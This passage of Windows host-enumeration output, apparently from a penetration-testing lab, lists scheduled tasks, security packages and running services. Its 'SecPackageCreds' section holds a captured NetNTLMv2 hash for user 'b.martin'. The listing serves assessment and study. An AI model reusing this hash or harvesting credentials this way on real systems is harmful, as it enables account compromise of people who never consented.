      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\system32\dxgiadaptercache.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Diagnostics
  Principal                         :
      GroupId                       :   
      Id                            :   System
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   -z
      Execute                       :   %windir%\system32\disksnapshot.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   StorageSense
  Principal                         :
      GroupId                       :   Users
      Id                            :   Authenticated Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {AB2A519B-03B0-43CE-940A-A73DF850B49A}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   EDP App Launch Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   AppLaunch
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   EDP Auth Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   ReAuth
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   EDP Inaccessible Credentials Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   MissingCredentials
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   StorageCardEncryption Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   SDCardEncryptionPolicy
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   ScanForUpdates
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {A558C6A5-B42B-4C98-B610-BF9559143139}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2013-12-31T16:00:00-08:00
      Interval                      :   P1D
      StopAtDurationEnd             :   False
      RandomDelay                   :   P1D
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   False
      StartBoundary                 :   2013-12-31T16:00:00-08:00
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   ScanForUpdatesAsUser
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   AllUsers
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;FRFX;;;IU)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {DDAFAEA2-8842-4E96-BADE-D44A8D676FDB}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   WakeUpAndContinueUpdates
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {0DC331EE-8438-49D5-A721-E10B937CE459}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   WakeUpAndScanForUpdates
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {D5A04D91-6FE6-4FE4-A98A-FEB4500C5AF7}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2013-12-31T16:00:00-08:00
      Interval                      :   P1D
      StopAtDurationEnd             :   False
      RandomDelay                   :   P1D
      ------------------------------

  Name                              :   Notifications
  Principal                         :
      GroupId                       :   Authenticated Users
      Id                            :   Creator
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   Location Notification
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;AU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\System32\LocationNotificationWindows.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   WindowsActionDialog
  Principal                         :
      GroupId                       :   Authenticated Users
      Id                            :   Creator
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   Location Notification
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;AU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\System32\WindowsActionDialog.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   SystemSoundsService
  Principal                         :
      GroupId                       :   Users
      Id                            :   Group
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   System Sounds User Mode Agent
  Source                            :   Microsoft Corporation
  State                             :   Disabled
  SDDL                              :   D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;AU)
  Enabled                           :   False
  Date                              :   6/23/2005 2:48:00 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {2DEA658F-54C1-4227-AF9B-260AB5FC3543}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   StartComponentCleanup
  Principal                         :
      GroupId                       :   
      Id                            :   System
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {752073A1-23F2-4396-85F0-8FDB879ED0ED}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Account Cleanup
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT30M
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   %windir%\System32\Windows.SharedPC.AccountManager.dll,StartMaintenance
      Execute                       :   %windir%\System32\rundll32.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Collection
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;BU)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT10M
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /d /c %systemroot%\system32\silcollector.cmd publish
      Execute                       :   %systemroot%\system32\cmd.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2000-01-01T03:00:00
      Interval                      :   PT1H
      StopAtDurationEnd             :   False
      RandomDelay                   :   PT30M
      ------------------------------

  Name                              :   Configuration
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;BU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT2M
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /d /c %systemroot%\system32\silcollector.cmd configure
      Execute                       :   %systemroot%\system32\cmd.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT1M
      ------------------------------

  Name                              :   SpaceManagerTask
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   $(@%SystemRoot%\system32\spaceman.exe,-2)
  Description                       :   $(@%SystemRoot%\system32\spaceman.exe,-3)
  Source                            :   $(@%SystemRoot%\system32\spaceman.exe,-1)
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /Work
      Execute                       :   %windir%\system32\spaceman.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   False
      StopAtDurationEnd             :   False
      Delay                         :   PT2M
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   HeadsetButtonPress
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:AI(A;;FA;;;BA)(A;;FA;;;SY)(A;;FA;;;AU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   StartedFromTask
      Execute                       :   %windir%\system32\speech_onecore\common\SpeechRuntime.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   MsCtfMonitor
  Principal                         :
      GroupId                       :   Users
      Id                            :   AnyUser
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   TextServicesFramework monitor task
  Source                            :   Microsoft Corporation
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;BU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Automatic-Device-Join
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   Register this computer if the computer is already joined to an Active Directory domain.
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:AI(A;;FA;;;NS)(A;;GA;;;SY)(A;ID;FA;;;BA)(A;ID;GRGX;;;AU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT5M
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   $(Arg0) $(Arg1) $(Arg2)
      Execute                       :   %SystemRoot%\System32\dsregcmd.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT1M
      ------------------------------
      Type                          :   MSFT_TaskEventTrigger
      Enabled                       :   True
      Duration                      :   P1D
      Interval                      :   PT1H
      StopAtDurationEnd             :   False
      Subscription                  :   <QueryList><Query Id="0" Path="Microsoft-Windows-User Device Registration/Admin"><Select Path="Microsoft-Windows-User Device Registration/Admin">*[System[Provider[@Name='Microsoft-Windows-User Device Registration'] and EventID=4096]]</Select></Query></QueryList>
      ------------------------------

  Name                              :   Recovery-Check
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   InteractiveUsers
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   Performs recovery check.
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:AI(A;;FA;;;NS)(A;;GA;;;SY)(A;ID;FA;;;BA)(A;ID;GRGX;;;AU)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /checkrecovery
      Execute                       :   %SystemRoot%\System32\dsregcmd.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

====== SearchIndex ======

ERROR: Unable to query the Search Indexer, Search Index is likely not running.
====== SecPackageCreds ======

  Version                        : NetNTLMv2
  Hash                           : b.martin::OSCP:1122334455667788:da208ba9a97185194152297fff3f5c8b:01010000000000006bd6f16f48a4dc0133fb255370da9d31000000000800300030000000000000000000000000200000ebda44c9528111c7aa6c6fdab865eb67f1324fe68423c1aaca04c03a1bc979750a00100000000000000000000000000000000000090000000000000000000000

====== SecurityPackages ======

Security Packages


  Name                           : Negotiate
  Comment                        : Microsoft Package Negotiator
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, NEGOTIABLE, GSS_COMPATIBLE, LOGON, RESTRICTED_TOKENS, APPCONTAINER_CHECKS
  MaxToken                       : 48256
  RPCID                          : 9
  Version                        : 1

  Name                           : NegoExtender
  Comment                        : NegoExtender Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, IMPERSONATION, NEGOTIABLE, GSS_COMPATIBLE, LOGON, MUTUAL_AUTH, NEGO_EXTENDER, APPCONTAINER_CHECKS
  MaxToken                       : 12000
  RPCID                          : 30
  Version                        : 1

  Name                           : Kerberos
  Comment                        : Microsoft Kerberos V1.0
  Capabilities                   : 42941375
  MaxToken                       : 48000
  RPCID                          : 16
  Version                        : 1

  Name                           : NTLM
  Comment                        : NTLM Security Package
  Capabilities                   : 42478391
  MaxToken                       : 2888
  RPCID                          : 10
  Version                        : 1

  Name                           : TSSSP
  Comment                        : TS Service Security Package
  Capabilities                   : CONNECTION, MULTI_REQUIRED, ACCEPT_WIN32_NAME, MUTUAL_AUTH, APPCONTAINER_CHECKS
  MaxToken                       : 13000
  RPCID                          : 22
  Version                        : 1

  Name                           : pku2u
  Comment                        : PKU2U Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, IMPERSONATION, GSS_COMPATIBLE, MUTUAL_AUTH, NEGOTIABLE2, APPCONTAINER_CHECKS
  MaxToken                       : 12000
  RPCID                          : 31
  Version                        : 1

  Name                           : CloudAP
  Comment                        : Cloud AP Security Package
  Capabilities                   : LOGON, NEGOTIABLE2
  MaxToken                       : 0
  RPCID                          : 36
  Version                        : 1

  Name                           : WDigest
  Comment                        : Digest Authentication for Windows
  Capabilities                   : TOKEN_ONLY, IMPERSONATION, ACCEPT_WIN32_NAME, APPCONTAINER_CHECKS
  MaxToken                       : 4096
  RPCID                          : 21
  Version                        : 1

  Name                           : Schannel
  Comment                        : Schannel Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 24576
  RPCID                          : 14
  Version                        : 1

  Name                           : Microsoft Unified Security Protocol Provider
  Comment                        : Schannel Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 24576
  RPCID                          : 14
  Version                        : 1

  Name                           : Default TLS SSP
  Comment                        : Schannel Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 24576
  RPCID                          : 14
  Version                        : 1

====== Services ======

Non Microsoft Services (via WMI)

  Name                           : Jenkins
  DisplayName                    : Jenkins
  Description                    : Jenkins Automation Server
  User                           : .\jenkins
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : "C:\Program Files\Jenkins\jenkins.exe"
  BinaryPath                     : C:\Program Files\Jenkins\jenkins.exe
  BinaryPathSDDL                 : 
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : 
  FileDescription                : 
  Version                        : 
  IsDotNet                       : 

  Name                           : Sense
  DisplayName                    : Sense
  Description                    : 
  User                           : LocalSystem
  State                          : Stopped
  StartMode                      : Manual
  ServiceCommand                 : "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"
  BinaryPath                     : C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe
  BinaryPathSDDL                 : 
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;OICIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRRCWDWO;;;BA)(A;;CCLCSWRPLOCRRC;;;IU)(A;;CCLCSWRPLOCRRC;;;SU)
  CompanyName                    : 
  FileDescription                : 
  Version                        : 
  IsDotNet                       : 

  Name                           : ssh-agent
  DisplayName                    : OpenSSH Authentication Agent
  Description                    : Agent to hold private keys used for public key authentication.
  User                           : LocalSystem
  State                          : Stopped
  StartMode                      : Disabled
  ServiceCommand                 : C:\Windows\System32\OpenSSH\ssh-agent.exe
  BinaryPath                     : C:\Windows\System32\OpenSSH\ssh-agent.exe
  BinaryPathSDDL                 : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;0x1200a9;;;SY)(A;;0x1200a9;;;BA)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;;0x1200a9;;;S-1-15-2-2)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;RP;;;AU)
  CompanyName                    : 
  FileDescription                : 
  Version                        : 7.7.2.1
  IsDotNet                       : False

  Name                           : VGAuthService
  DisplayName                    : VMware Alias Manager and Ticket Service
  Description                    : Alias Manager and Ticket Service
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
  BinaryPath                     : C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
  BinaryPathSDDL                 : O:SYD:(A;ID;FA;;;BA)(A;ID;0x1200a9;;;WD)(A;ID;FA;;;SY)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware Guest Authentication Service
  Version                        : 12.1.0.63013
  IsDotNet                       : False

  Name                           : VM3DService
  DisplayName                    : VMware SVGA Helper Service
  Description                    : Helps VMware SVGA driver by collecting and conveying user mode information
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : C:\Windows\system32\vm3dservice.exe
  BinaryPath                     : C:\Windows\system32\vm3dservice.exe
  BinaryPathSDDL                 : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;FA;;;SY)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;;0x1200a9;;;S-1-15-2-2)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware SVGA Helper Service
  Version                        : 9.17.04.0001
  IsDotNet                       : False

  Name                           : VMTools
  DisplayName                    : VMware Tools
  Description                    : Provides support for synchronizing objects between the host and guest operating systems.
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
  BinaryPath                     : C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
